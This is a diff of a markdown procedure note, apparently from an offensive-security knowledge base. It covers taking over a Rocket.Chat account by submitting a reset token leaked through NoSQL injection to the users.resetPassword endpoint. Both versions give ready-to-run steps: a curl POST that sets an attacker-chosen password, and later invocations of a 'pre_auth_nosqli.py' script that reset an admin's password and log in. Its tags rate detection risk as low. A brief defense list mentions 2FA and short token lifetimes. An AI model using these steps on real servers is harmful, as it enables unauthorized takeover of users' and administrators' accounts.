@@ -1,16 +1,13 @@
 ---
-id: proc-rocket-password-reset
 tags:
+  - password-reset
   - account-takeover
-  - credential-access
 type: procedure
 tools:
-  - '[[tools/Python3]]'
-  - '[[tools/requests]]'
+  - '[[tools/pre_auth_nosqli.py]]'
 tactics:
   - '[[Credential Access]]'
-commands:
-  - '[[commands/curl-password-reset-submit]]'
+commands: []
 verified: false
 platforms:
   - Web
@@ -18,11 +15,12 @@ submitted: true
 created_at: '2023-10-01T00:00:00Z'
 techniques:
   - '[[Valid Accounts]]'
-updated_at: '2025-12-14T03:46:19.927Z'
-skill_level: beginner
+updated_at: '2025-12-14T17:31:30.567Z'
+skill_level: intermediate
 impact_level: high
 detection_risk: low
 sub_techniques: []
+id: c6bc1240-35f3-43f3-86f0-c675dff0a129
 validated: true
 mitre_tactics:
   - '[[Credential Access]]'
@@ -33,46 +31,55 @@ mitre_techniques:
 
 ## Summary
 
-This procedure uses the leaked reset token to submit a new attacker-controlled password via the Rocket.Chat reset endpoint, resulting in full account takeover.
+This procedure uses the extracted reset token to change the target's password, achieving account takeover without 2FA or email verification.
 
 ## Description
 
-After obtaining the token through injection, POST it along with a new password to /api/v1/users.resetPassword. This works only if the target has no email verification or TOTP 2FA enabled. The account is immediately controllable, allowing login and privilege escalation if admin.
+Submit a reset request to the API with the full leaked token and a new password. The endpoint validates the token directly from DB, bypassing user interaction. Works if no TOTP enabled. Leads to login as the target, especially admins for escalation.
 
 ## Requirements
 
-1. Leaked reset token from prior step
-2. Target Rocket.Chat URL
-3. New password (strong enough to pass policy)
-4. No 2FA on target account
+1. Full leaked token
+2. API access
+3. New password (attacker-controlled)
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Mandate TOTP 2FA for all users, especially admins
-- Shorten token expiration times (e.g., 5 minutes)
-- Log and alert on reset completions
+- Implement token expiration (short TTL)
 - Require email confirmation for resets
+- Enable 2FA on admin accounts
 
 ## Objectives
 
-1. Gain control of target account
-2. Access user privileges and data
-3. Escalate if admin
+1. Gain valid credentials
+2. Access user account
+3. Prepare for privilege abuse
 
 ## Instructions
 
-### Step 1: Submit Reset Request with Token
+### Step 1: Submit Reset with Token
 
-**Context**: Use the token to authenticate the reset and set a new password.
+**Context**: POST to resetPassword endpoint with token and new pass.
 
-**Command** ([[commands/curl-password-reset-submit]]):
+**Command** ([[commands/run-exploit-script]]):
 ```bash
-curl -X POST 'http://target:3000/api/v1/users.resetPassword' -H 'Content-Type: application/json' -d '{"token":"leaked_token_here","user":{"password":"NewAttackerPass123!"}}'
+python3 pre_auth_nosqli.py 'http://localhost:3000' 'admin@rocketchat.local' --reset-password --token 'full_leaked_token' --new-password 'newpass123'
 ```
 
-> Expect {"success": true}; now login with the new password.
+> API call: {"token":"leaked","newPassword":"newpass"}. Expected output: {"success":true}.
+
+### Step 2: Test Login
+
+**Context**: Verify with login attempt.
+
+**Command** ([[commands/run-exploit-script]]):
+```bash
+python3 pre_auth_nosqli.py 'http://localhost:3000' 'admin@rocketchat.local' --login --password 'newpass123'
+```
+
+> Gains session. Expected: Auth token received.
 
 ## MITRE ATT&CK Mapping
 
@@ -89,14 +96,12 @@ curl -X POST 'http://target:3000/api/v1/users.resetPassword' -H 'Content-Type: a
 
 ## Commands Used
 
-- [[commands/curl-password-reset-submit]]
 
 ## Tools Used
 
-- [[tools/Python3]]
-- [[tools/requests]]
+- [[tools/pre_auth_nosqli.py]]
 
 ## Tags
 
+- password-reset
 - account-takeover
-- credential-access
